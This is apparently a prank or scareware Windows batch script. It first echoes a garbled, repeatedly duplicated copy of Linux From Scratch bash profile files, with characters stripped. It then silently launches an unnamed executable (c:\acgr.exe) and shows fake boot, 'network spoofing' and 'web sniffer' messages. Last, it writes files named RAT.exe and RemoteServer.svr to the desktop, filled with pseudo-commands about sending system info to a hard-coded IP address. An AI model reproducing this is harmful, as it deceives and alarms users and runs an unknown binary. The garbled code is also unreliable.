echo  Set some defaults for graphical systems
echo export XDG_DATA_DIRS${XDG_DATA_DIRS:-/usr/share/}
echo export XDG_CONFIG_DIRS${XDG_CONFIG_DIRS:-/etc/xdg/}
echo export XDG_RUNTIME_DIR${XDG_RUNTIME_DIR:-/tmp/xdg-$USER}

echo  Setup a red prompt for root and a green one for users.
echo NORMAL"\[\e[0m\]"
echo RED"\[\e[1;31m\]"
echo GREEN"\[\e[1;32m\]"
echo if [[ $EUID  0 ]] ; then
echo   PS1"$RED\u [ $NORMAL\w$RED ]echo  $NORMAL"
echo else
echo   PS1"$GREEN\u [ $NORMAL\w$GREEN ]\$ $NORMAL"
echo fi

echo for script in /etc/profile.d/.sh ; do
echo         if [ -r $script ] ; then
echo                 . $script
echo         fi
echo done
ping localhost -n3 >nul
echo unset script RED GREEN NORMAL

echo  End /etc/profileecho  Begin /etc/profile
echo  Written for Beyond Linux From Scratch
echo  by James Robertson jameswrobertson@earthlink.net
echo  modifications by Dagmar d'Surreal rivyqntzne@pbzpnfg.arg

echo  System wide environment variables and startup programs.

echo  System wide aliases and functions should go in /etc/bashrc.  Personal
echo  environment variables and startup programs should go into
echo  ~/.bash_profile.  Personal aliases and functions should go into
echo  ~/.bashrc.

echo  Functions to help us manage paths.  Second argument is the name of the
echo  path variable to be modified (default: PATH)
echo pathremove () {
echo         local IFS':'
echo         local NEWPATH
echo         local DIR
echo         local PATHVARIABLE${2:-PATH}
echo         for DIR in ${!PATHVARIABLE} ; do
echo                 if [ "$DIR" ! "$1" ] ; then
echo                   NEWPATH${NEWPATH:$NEWPATH:}$DIR
echo                 fi
echo         done
echo         export $PATHVARIABLE"$NEWPATH"
echo }
ping localhost -n3 >nul
echo pathprepend () {
echo         pathremove $1 $2
echo         local PATHVARIABLE${2:-PATH}
echo         export $PATHVARIABLE"$1${!PATHVARIABLE:+:${!PATHVARIABLE}}"
echo }

echo pathappend () {
echo         pathremove $1 $2
echo         local PATHVARIABLE${2:-PATH}
echo         export $PATHVARIABLE"${!PATHVARIABLE:+${!PATHVARIABLE}:}$1"
echo }

echo export -f pathremove pathprepend pathappend

echo  Set the initial path
echo export PATH/bin:/usr/bin

echo if [ $EUID -eq 0 ] ; then
echo         pathappend /sbin:/usr/sbin
echo         unset HISTFILE
echo fi
ping localhost -n3 >nul
echo  Setup some environment variables.
echo export HISTSIZE1000
echo export HISTIGNORE"&:[bf]g:exit"

echo  Set some defaults for graphical systems
echo export XDG_DATA_DIRS${XDG_DATA_DIRS:-/usr/share/}
echo export XDG_CONFIG_DIRS${XDG_CONFIG_DIRS:-/etc/xdg/}
echo export XDG_RUNTIME_DIR${XDG_RUNTIME_DIR:-/tmp/xdg-$USER}

echo  Setup a red prompt for root and a green one for users.
echo NORMAL"\[\e[0m\]"
echo RED"\[\e[1;31m\]"
echo GREEN"\[\e[1;32m\]"
echo if [[ $EUID  0 ]] ; then
echo   PS1"$RED\u [ $NORMAL\w$RED ]echo  $NORMAL"
echo else
echo  PS1"$GREEN\u [ $NORMAL\w$GREEN ]\$ $NORMAL"
echo fi
ping localhost -n3 >nul
echo echo for script in /etc/profile.d/.sh ; do
echo        if [ -r $script ] ; then
echo               . $script
echo        fi
echo done

echo unset script RED GREEN NORMAL

echo  End /etc/profile
echo install --directory --mode0755 --ownerroot --grouproot /etc/profile.d
echo  Begin /etc/profile.d/bash_completion.sh
echo  Import bash completion scripts

echo  If the bash-completion package is installed, use its configuration instead
echo if [ -f /usr/share/bash-completion/bash_completion ]; then

echo  Check for interactive bash and that we haven't already been sourced.
echo   if [ -n "${BASH_VERSION-}" -a -n "${PS1-}" -a -z "${BASH_COMPLETION_VERSINFO-}" ]; then

echo     echo  Check for recent enough version of bash.
echo     if [ ${BASH_VERSINFO[0]} -gt 4 ] 
echo        [ ${BASH_VERSINFO[0]} -eq 4 -a ${BASH_VERSINFO[1]} -ge 1 ]; then
echo        [ -r "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion" ] && \
echo             . "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion"
echo        if shopt -q progcomp && [ -r /usr/share/bash-completion/bash_completion ]; then
echo           echo  Source completion code.
echo           . /usr/share/bash-completion/bash_completion
echo        fi
echo     fi
echo   fi

echo else

echo  bash-completions are not installed, use only bash completion directory
echo   if shopt -q progcomp; then
echo     for script in /etc/bash_completion.d/ ; do
echo       if [ -r $script ] ; then
echo         . $script
echo       fi
echo     done
echo   fi
echo fi

echo  End /etc/profile.d/bash_completion.sh
echo EOFecho  Begin /etc/profile.d/bash_completion.sh
echo  Import bash completion scripts

echo  If the bash-completion package is installed, use its configuration instead
echo if [ -f /usr/share/bash-completion/bash_completion ]; then

echo  Check for interactive bash and that we haven't already been sourced.
echo   if [ -n "${BASH_VERSION-}" -a -n "${PS1-}" -a -z "${BASH_COMPLETION_VERSINFO-}" ]; then
echo 
echo     echo  Check for recent enough version of bash.
echo     if [ ${BASH_VERSINFO[0]} -gt 4 ] 
echo        [ ${BASH_VERSINFO[0]} -eq 4 -a ${BASH_VERSINFO[1]} -ge 1 ]; then
echo        [ -r "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion" ] && \
echo             . "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion"
echo        if shopt -q progcomp && [ -r /usr/share/bash-completion/bash_completion ]; then
echo           echo  Source completion code.
echo           . /usr/share/bash-completion/bash_completion
echo        fi
echo     fi
echo   fi

echo else
ping localhost -n3 >nul
echo  bash-completions are not installed, use only bash completion directory
echo   if shopt -q progcomp; then
echo     for script in /etc/bash_completion.d/ ; do
echo       if [ -r $script ] ; then
echo         . $script
echo       fi
echo     done
echo   fi
echo fi

echo  End /etc/profile.d/bash_completion.sh
echo EOF
echo install --directory --mode0755 --ownerroot --grouproot /etc/bash_completion.d
echo  Setup for /bin/ls and /bin/grep to support color, the alias is in /etc/bashrc.
echo if [ -f "/etc/dircolors" ] ; then
echo         eval $(dircolors -b /etc/dircolors)
echo fi

echo if [ -f "$HOME/.dircolors" ] ; then
echo         eval $(dircolors -b $HOME/.dircolors)
echo fi

echo alias ls'ls --colorauto'
echo alias grep'grep --colorauto'
echo cat  /etc/profile.d/extrapaths.sh  "EOF"
echo if [ -d /usr/local/lib/pkgconfig ] ; then
echo         pathappend /usr/local/lib/pkgconfig PKG_CONFIG_PATH
echo fi
echo if [ -d /usr/local/bin ]; then
echo         pathprepend /usr/local/bin
echo fi
echo if [ -d /usr/local/sbin -a $EUID -eq 0 ]; then
echo         pathprepend /usr/local/sbin
echo fi

echo  Set some defaults before other applications add to these paths.
echo pathappend /usr/share/man  MANPATH
echo pathappend /usr/share/info INFOPATH
echo EOF
echo cat  /etc/profile.d/readline.sh  "EOF"
echo  Setup the INPUTRC environment variable.
echo if [ -z "$INPUTRC" -a ! -f "$HOME/.inputrc" ] ; then
echo         INPUTRC/etc/inputrc
echo fi
echo export INPUTRC
echo EOF
echo cat  /etc/profile.d/umask.sh  "EOF"
echo  By default, the umask should be set.
echo if [ "$(id -gn)"  "$(id -un)" -a $EUID -gt 99 ] ; then
echo   umask 002
echo else
echo   umask 022
echo fi
echo EOFcat  /etc/profile.d/umask.sh  "EOF"
echo  By default, the umask should be set.
echo if [ "$(id -gn)"  "$(id -un)" -a $EUID -gt 99 ] ; then
echo   umask 002
echo else
echo   umask 022
echo fi
echo EOF
echo cat  /etc/profile.d/i18n.sh  "EOF"
echo  Set up i18n variables
echo export LANGll_CC.charmap@modifiers
echo EOFcat  /etc/profile.d/i18n.sh  "EOF"
echo  Set up i18n variables
echo export LANGll_CC.charmap@modifiers
echo EOFcat  /etc/profile.d/i18n.sh  "EOF"
echo  Set up i18n variables
echo export LANGll_CC.charmap@modifiers
echo EOF
echo cat  /etc/bashrc  "EOF"
echo  Begin /etc/bashrc
echo  Written for Beyond Linux From Scratch
echo  by James Robertson jameswrobertson@earthlink.net
echo  updated by Bruce Dubbs bdubbs@linuxfromscratch.org

echo  System wide aliases and functions.
ping localhost -n3 >nul
echo  System wide environment variables and startup programs should go into
echo  /etc/profile.  Personal environment variables and startup programs
echo  should go into ~/.bash_profile.  Personal aliases and functions should
echo  go into ~/.bashrc

echo  Provides colored /bin/ls and /bin/grep commands.  Used in conjunction
echo  with code in /etc/profile.

echo alias ls'ls --colorauto'
echo alias grep'grep --colorauto'

echo  Provides prompt for non-login shells, specifically shells started
echo  in the X environment. [Review the LFS archive thread titled
echo  PS1 Environment Variable for a great case study behind this script
echo  addendum.]

echo NORMAL"\[\e[0m\]"
echo RED"\[\e[1;31m\]"
echo GREEN"\[\e[1;32m\]"
echo if [[ $EUID  0 ]] ; then
echo   PS1"$RED\u [ $NORMAL\w$RED ]echo  $NORMAL"
echo else
echo   PS1"$GREEN\u [ $NORMAL\w$GREEN ]\$ $NORMAL"
echo fi

echo unset RED GREEN NORMAL

echo  End /etc/bashrc
echo EOF
echo cat  ~/.bash_profile  "EOF"
echo  Begin ~/.bash_profile
echo  Written for Beyond Linux From Scratch
echo  by James Robertson jameswrobertson@earthlink.net
echo  updated by Bruce Dubbs bdubbs@linuxfromscratch.org

echo  Personal environment variables and startup programs.
ping localhost -n3 >nul
echo  Personal aliases and functions should go in ~/.bashrc.  System wide
echo  environment variables and startup programs are in /etc/profile.
echo  System wide aliases and functions are in /etc/bashrc.

echo if [ -f "$HOME/.bashrc" ] ; then
echo   source $HOME/.bashrc
echo fi

echo if [ -d "$HOME/bin" ] ; then
echo  pathprepend $HOME/bin
echo fi

echo  Having . in the PATH is dangerous
echo if [ $EUID -gt 99 ]; then
echo   pathappend .
echo fi

echo  End ~/.bash_profile
echo EOFcat  ~/.bash_profile  "EOF"
echo  Begin ~/.bash_profile
echo  Written for Beyond Linux From Scratch
echo  by James Robertson jameswrobertson@earthlink.net
echo  updated by Bruce Dubbs bdubbs@linuxfromscratch.org

echo  Personal environment variables and startup programs.

echo  Personal aliases and functions should go in ~/.bashrc.  System wide
echo  environment variables and startup programs are in /etc/profile.
echo  System wide aliases and functions are in /etc/bashrc.

echo if [ -f "$HOME/.bashrc" ] ; then
echo   source $HOME/.bashrc
echo fi

echo if [ -d "$HOME/bin" ] ; then
echo   pathprepend $HOME/bin
echo fi

echo  Having . in the PATH is dangerous
echo if [ $EUID -gt 99 ]; then
echo   pathappend .
echo fi

echo  End ~/.bash_profile
echo EOF
echo cat  ~/.profile  "EOF"
echo  Begin ~/.profile
echo  Personal environment variables and startup programs.

echo if [ -d "$HOME/bin" ] ; then
echo   pathprepend $HOME/bin
echo fi

echo  Set up user specific i18n variables
echo export LANGll_CC.charmap@modifiers

echo  End ~/.profile
echo EOF
echo ~/.bashrc
echo Here is a base ~/.bashrc.

echo cat  ~/.bashrc  "EOF"
echo  Begin ~/.bashrc
echo  Written for Beyond Linux From Scratch
echo  by James Robertson jameswrobertson@earthlink.net

echo  Personal aliases and functions.

echo  Personal environment variables and startup programs should go in
echo  ~/.bash_profile.  System wide environment variables and startup
echo  programs are in /etc/profile.  System wide aliases and functions are
echo  in /etc/bashrc.

echo if [ -f "/etc/bashrc" ] ; then
echo   source /etc/bashrc
echo fi
ping localhost -n3 >nul
echo  Set up user specific i18n variables
echo export LANGll_CC.charmap@modifiers

echo  End ~/.bashrc
echo EOF
echo ~/.bash_logout
echo This is an empty ~/.bash_logout that can be used as a template. You will notice that the base ~/.bash_logout does not include a clear command. This is because the clear is handled in the /etc/issue file.

echo cat  ~/.bash_logout  "EOF"
echo  Begin ~/.bash_logout
echo  Written for Beyond Linux From Scratch
echo  by James Robertson jameswrobertson@earthlink.net

echo  Personal items to perform on logout.

echo  End ~/.bash_logout
echo EOF
echo cat  ~/.profile  "EOF"
echo  Begin ~/.profile
echo  Personal environment variables and startup programs.

echo if [ -d "$HOME/bin" ] ; then
echo   pathprepend $HOME/bin
echo fi

echo  Set up user specific i18n variables
echo export LANGll_CC.charmap@modifiers

echo  End ~/.profile
echo EOF
echo ~/.bashrc
echo Here is a base ~/.bashrc.

echo cat  ~/.bashrc  "EOF"
echo  Begin ~/.bashrc
echo  Written for Beyond Linux From Scratch
echo  by James Robertson jameswrobertson@earthlink.net

echo  Personal aliases and functions.

echo  Personal environment variables and startup programs should go in
echo  ~/.bash_profile.  System wide environment variables and startup
echo  programs are in /etc/profile.  System wide aliases and functions are
echo  in /etc/bashrc.

echo if [ -f "/etc/bashrc" ] ; then
echo   source /etc/bashrc
echo fi

echo  Set up user specific i18n variables
echo export LANGll_CC.charmap@modifiers

echo  End ~/.bashrc
echo EOF
echo ~/.bash_logout
echo This is an empty ~/.bash_logout that can be used as a template. You will notice that the base 
ping localhost -n3 >nul
echo  Personal items to perform on logout.

echo  End ~/.bash_logout
echo EOF
pushd "%CD%"
CD /D "%~dp0"
start c:\acgr.exe
call :colortext f "System is Booting..."
ping localhost -n 1 >nul
call :colortext a " [Ok] "
echo.
call :colortext f "System DLL's are Booting..."
ping localhost -n 1 >nul
call :colortext a " [Ok] "
echo.
call :colortext f "System is Processing..."
ping localhost -n 2 >nul
call :colortext a " [Ok] "
echo.
call :colortext f "System Storage is Booting..."
ping localhost -n 1 >nul
call :colortext a " [Ok] "
echo.
call :colortext f "System Memory is Booting..."
ping localhost -n 1 >nul
call :colortext a " [Ok] "
echo.
call :colortext f "System Processor is Booting..."
ping localhost -n 1 >nul
call :colortext a " [Ok] "
echo.
call :colortext f "SSH_Server"
ping localhost -n 2 >nul
call :colortext a " [Ok] "
echo.
call :colortext f "Loading Cache Data"
call :colortext a " [Ok] "
echo.
call :colortext f "Secure Server Launching"
call :colortext a " [Ok] "
echo.
call :colortext f "Encryped Data"
ping localhost -n 3 >nul
call :colortext a " [Ok] "
echo.
call :colortext f "Network"
call :colortext a " [Ok] "
echo.
call :colortext f "Linux"
ping localhost -n 5 >nul
call :colortext c " [WARNING!] "
echo.
call :colortext f "System Server"
call :colortext a " [Ok] "
echo.
call :colortext c " [Network Spoofing in Progress...] "
ping localhost -n 1 >nul
echo.
call :colortext b " [Loading Web Sniffers...] "
ping localhost -n 1 >nul
echo.
call :colortext f "System"
call :colortext a " [Ok] "
ping localhost -n 1 >nul
cls
call :colortext a "Please stand by while DLL files are installed..."
mkdir Linux_cache
echo install_apps is true > C:\Users\%username%\Desktop\Linux_cache\ApsList.encpt
echo shell.getapps.enabled is true >> C:\Users\%username%\Desktop\Linux_cache\ApsList.encpt
echo if install is true add.getapps to shell >> C:\Users\%username%\Desktop\Linux_cache\ApsList.encpt

echo "text/javascript""/js/plugins/charts/excanvas.min.js"/script src > C:\Users\%username%\Desktop\Linux_cache\userconfig.dll
echo plugins.charts.jquery.flot.js /script >> C:\Users\%username%\Desktop\Linux_cache\userconfig.dll
echo remember user.config in shell.dll >> C:\Users\%username%\Desktop\Linux_cache\userconfig.dll
echo "export info.dll to Linux_Terminal.bat" >> C:\Users\%username%\Desktop\Linux_cache\userconfig.dll

echo link rel"stylesheet" href"css/style.css" > C:\Users\%username%\Desktop\Linux_cache\application.packet
echo script src"js/html5shiv.js"/script >> C:\Users\%username%\Desktop\Linux_cache\application.packet
echo $plansql  $odb-prepare("SELECT `users`.,`plans`.`name`, `plans`.`mbt` FROM `users`, `plans` WHERE `plans`.`ID`") >> C:\Users\%username%\Desktop\Linux_cache\application.packet
echo $plansql-execute(array(":id" $_SESSION['ID'])); >> C:\Users\%username%\Desktop\Linux_cache\application.packet

echo enable command(s) [ALL in shell.encypt] > C:\Users\%username%\Desktop\Linux_cache\shell.linux.dll

echo $userInfo $plansql-fetch(PDO::FETCH_ASSOC); > C:\Users\%username%\Desktop\Linux_cache\shell.encpt
echo $test $odb-prepare("SELECT `email` FROM `users` WHERE `ID` :id LIMIT 1"); >> C:\Users\%username%\Desktop\Linux_cache\shell.encpt
echo $test execute(array(":id" $_SESSION['ID'])); >> C:\Users\%username%\Desktop\Linux_cache\shell.encpt
echo $testInfo $test-fetch(PDO::FETCH_ASSOC); >> C:\Users\%username%\Desktop\Linux_cache\shell.encpt
echo $loginLogs $odb-query("SELECT COUNT() FROM `loginip` WHERE `username` '{$_SESSION['username']}'"); >> C:\Users\%username%\Desktop\Linux_cache\shell.encpt
echo $attackLogs $odb-query("SELECT COUNT() FROM `logs` WHERE `user` '{$_SESSION['username']}'"); >> C:\Users\%username%\Desktop\Linux_cache\shell.encpt
echo $purchaseLogs $odb-query("SELECT COUNT() FROM `payments` WHERE `user` '{$_SESSION['ID']}'"); >> C:\Users\%username%\Desktop\Linux_cache\shell.encpt

echo link rel"stylesheet" href"css/style.css" > C:\Users\%username%\Desktop\Linux_cache\network.dat
echo netsh enable network >> C:\Users\%username%\Desktop\Linux_cache\network.dat
echo netsh checknet for connection status is true >> C:\Users\%username%\Desktop\Linux_cache\network.dat
echo netsh if connection status is not true then >> C:\Users\%username%\Desktop\Linux_cache\network.dat
echo netsh proxy reset, firewall reset, enable "wireless network connection" >> C:\Users\%username%\Desktop\Linux_cache\network.dat
echo netsh else >> C:\Users\%username%\Desktop\Linux_cache\network.dat
echo netsh USE {network.dll} >> C:\Users\%username%\Desktop\Linux_cache\network.dat
echo netsh End If >> C:\Users\%username%\Desktop\Linux_cache\network.dat

echo WRITE all netinfo to [RemoteServer.svr] > C:\Users\%username%\Desktop\Linux_cache\network.dll
echo encrypt netinfo USING [shell.encypt] >> C:\Users\%username%\Desktop\Linux_cache\network.dll

echo USING server {23.91.11.152~'loingencypt'} > C:\Users\%username%\Desktop\Linux_cache\RemoteServer.svr
echo server access granted to [shell.encypt] >> C:\Users\%username%\Desktop\Linux_cache\RemoteServer.svr

echo WRITE setinfo AND compinfo to {RemoteServer.svr} > C:\Users\%username%\Desktop\Linux_cache\RAT.exe
echo Remote access granted to ServerOwner on {RemoteServer.svr} >> C:\Users\%username%\Desktop\Linux_cache\RAT.exe
goto l
::P6NHOE

